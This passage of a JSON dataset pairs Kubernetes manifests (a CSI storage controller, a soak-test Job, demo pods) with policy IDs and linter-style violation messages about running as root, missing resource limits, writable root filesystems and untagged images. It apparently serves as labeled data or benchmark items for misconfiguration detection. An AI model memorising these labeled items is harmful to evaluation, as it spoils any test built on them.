    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"liveness-probe\" has memory limit 0"
  },
  {
    "id": "04157",
    "manifest_path": "data/manifests/the_stack_sample/sample_1884.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-sfs-turbo-controller\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-sfs-turbo-controller\n  template:\n    metadata:\n      labels:\n        app: csi-sfs-turbo-controller\n    spec:\n      serviceAccountName: csi-sfs-turbo-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: quay.io/k8scsi/csi-provisioner:v1.4.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        - --enable-leader-election\n        - --leader-election-type=leases\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: csi-attacher\n        image: quay.io/k8scsi/csi-attacher:v3.1.0\n        args:\n        - -v=5\n        - --csi-address=$(ADDRESS)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      - name: sfs-turbo-csi-plugin\n        image: registry.eu-west-0.prod-cloud-ocb.orange-business.com/official/sfsturbo-csi-plugin:v1.8\n        args:\n        - --v=2\n        - --logtostderr\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(NODE_ID)\n        - --cloud-config=$(CLOUD_CONFIG)\n        ports:\n        - containerPort: 28888\n          name: healthz\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: NODE_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CSI_ENDPOINT\n          value: unix://csi/csi.sock\n        - name: CLOUD_CONFIG\n          value: /etc/sfs-turbo/cloud-config\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/sfs-turbo/\n          name: sfs-turbo-config\n      - name: liveness-probe\n        imagePullPolicy: Always\n        image: quay.io/k8scsi/livenessprobe:v1.1.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --connection-timeout=3s\n        - --health-port=28888\n        - --v=5\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: sfs-turbo-config\n        hostPath:\n          path: /etc/sfs-turbo/\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sfs-turbo-csi-plugin\" has memory limit 0"
  },
  {
    "id": "04158",
    "manifest_path": "data/manifests/the_stack_sample/sample_1887.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-soak-tests\nspec:\n  template:\n    spec:\n      containers:\n      - name: soak\n        image: docker-registry-default.centralpark2.lightbend.com/akka-long-running/cluster-soak-tests\n        imagePullPolicy: Always\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"soak\" is using an invalid container image, \"docker-registry-default.centralpark2.lightbend.com/akka-long-running/cluster-soak-tests\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04159",
    "manifest_path": "data/manifests/the_stack_sample/sample_1887.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-soak-tests\nspec:\n  template:\n    spec:\n      containers:\n      - name: soak\n        image: docker-registry-default.centralpark2.lightbend.com/akka-long-running/cluster-soak-tests\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"soak\" does not have a read-only root file system"
  },
  {
    "id": "04160",
    "manifest_path": "data/manifests/the_stack_sample/sample_1887.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-soak-tests\nspec:\n  template:\n    spec:\n      containers:\n      - name: soak\n        image: docker-registry-default.centralpark2.lightbend.com/akka-long-running/cluster-soak-tests\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"soak\" is not set to runAsNonRoot"
  },
  {
    "id": "04161",
    "manifest_path": "data/manifests/the_stack_sample/sample_1887.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-soak-tests\nspec:\n  template:\n    spec:\n      containers:\n      - name: soak\n        image: docker-registry-default.centralpark2.lightbend.com/akka-long-running/cluster-soak-tests\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"soak\" has cpu request 0"
  },
  {
    "id": "04162",
    "manifest_path": "data/manifests/the_stack_sample/sample_1887.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-soak-tests\nspec:\n  template:\n    spec:\n      containers:\n      - name: soak\n        image: docker-registry-default.centralpark2.lightbend.com/akka-long-running/cluster-soak-tests\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"soak\" has memory limit 0"
  },
  {
    "id": "04163",
    "manifest_path": "data/manifests/the_stack_sample/sample_1892.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: msg-path-demo\nspec:\n  containers:\n  - name: msg-path-demo-container\n    image: debian\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"msg-path-demo-container\" is using an invalid container image, \"debian\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04164",
    "manifest_path": "data/manifests/the_stack_sample/sample_1892.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: msg-path-demo\nspec:\n  containers:\n  - name: msg-path-demo-container\n    image: debian\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"msg-path-demo-container\" does not have a read-only root file system"
  },
  {
    "id": "04165",
    "manifest_path": "data/manifests/the_stack_sample/sample_1892.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: msg-path-demo\nspec:\n  containers:\n  - name: msg-path-demo-container\n    image: debian\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"msg-path-demo-container\" is not set to runAsNonRoot"
  },
  {
    "id": "04166",
    "manifest_path": "data/manifests/the_stack_sample/sample_1892.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: msg-path-demo\nspec:\n  containers:\n  - name: msg-path-demo-container\n    image: debian\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"msg-path-demo-container\" has cpu request 0"
  },
  {
    "id": "04167",
    "manifest_path": "data/manifests/the_stack_sample/sample_1892.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: msg-path-demo\nspec:\n  containers:\n  - name: msg-path-demo-container\n    image: debian\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"msg-path-demo-container\" has memory limit 0"
  },
  {
    "id": "04168",
    "manifest_path": "data/manifests/the_stack_sample/sample_1900.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cirros-vm\n  annotations:\n    kubernetes.io/target-runtime: virtlet.cloud\nspec:\n  affinity:\n    nodeAffinity:\n      requiredDuringSchedulingIgnoredDuringExecution:\n        nodeSelectorTerms:\n        - matchExpressions:\n          - key: extraRuntime\n            operator: In\n            values:\n            - virtlet\n  containers:\n  - name: cirros-vm\n    imagePullPolicy: IfNotPresent\n    image: virtlet.cloud/cirros\n  volumes:\n  - name: raw\n    flexVolume:\n      driver: virtlet/flexvolume_driver\n      options:\n        type: raw\n        path: /dev/loop0\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cirros-vm\" is using an invalid container image, \"virtlet.cloud/cirros\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04169",
    "manifest_path": "data/manifests/the_stack_sample/sample_1900.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cirros-vm\n  annotations:\n    kubernetes.io/target-runtime: virtlet.cloud\nspec:\n  affinity:\n    nodeAffinity:\n      requiredDuringSchedulingIgnoredDuringExecution:\n        nodeSelectorTerms:\n        - matchExpressions:\n          - key: extraRuntime\n            operator: In\n            values:\n            - virtlet\n  containers:\n  - name: cirros-vm\n    imagePullPolicy: IfNotPresent\n    image: virtlet.cloud/cirros\n  volumes:\n  - name: raw\n    flexVolume:\n      driver: virtlet/flexvolume_driver\n      options:\n        type: raw\n        path: /dev/loop0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cirros-vm\" does not have a read-only root file system"
  },
  {
    "id": "04170",
    "manifest_path": "data/manifests/the_stack_sample/sample_1900.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cirros-vm\n  annotations:\n    kubernetes.io/target-runtime: virtlet.cloud\nspec:\n  affinity:\n    nodeAffinity:\n      requiredDuringSchedulingIgnoredDuringExecution:\n        nodeSelectorTerms:\n        - matchExpressions:\n          - key: extraRuntime\n            operator: In\n            values:\n            - virtlet\n  containers:\n  - name: cirros-vm\n    imagePullPolicy: IfNotPresent\n    image: virtlet.cloud/cirros\n  volumes:\n  - name: raw\n    flexVolume:\n      driver: virtlet/flexvolume_driver\n      options:\n        type: raw\n        path: /dev/loop0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cirros-vm\" is not set to runAsNonRoot"
  }
]